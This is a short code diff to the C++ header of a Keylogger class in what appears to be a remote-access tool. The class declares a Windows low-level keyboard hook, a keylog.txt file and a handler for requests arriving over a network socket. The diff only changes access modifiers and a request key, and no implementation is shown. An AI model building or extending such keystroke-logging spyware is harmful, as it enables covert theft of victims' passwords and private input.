@@ -5,7 +5,8 @@
 #include "RequestHandler.hpp"
 
 class Keylogger : public FeatureHandler {
-    constexpr static int REQUEST_KEY = 0x02;
+public:
+    constexpr static int REQUEST_KEY = 0x01;
     constexpr static std::string KEYLOG_FILENAME = "keylog.txt";
     static std::atomic_bool isKeyloggerRunning;
     static FILE *keylogFile;
@@ -16,7 +17,6 @@ class Keylogger : public FeatureHandler {
     static std::atomic_bool isShiftPressed;
     static std::atomic_bool isCapsLockOn;
     static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam);
-public:
     static DWORD WINAPI SKeylogger(LPVOID *);
     static void StopKeylogger();
     void HandleRequest(SOCKET client_socket, const PacketHeader &header) override;
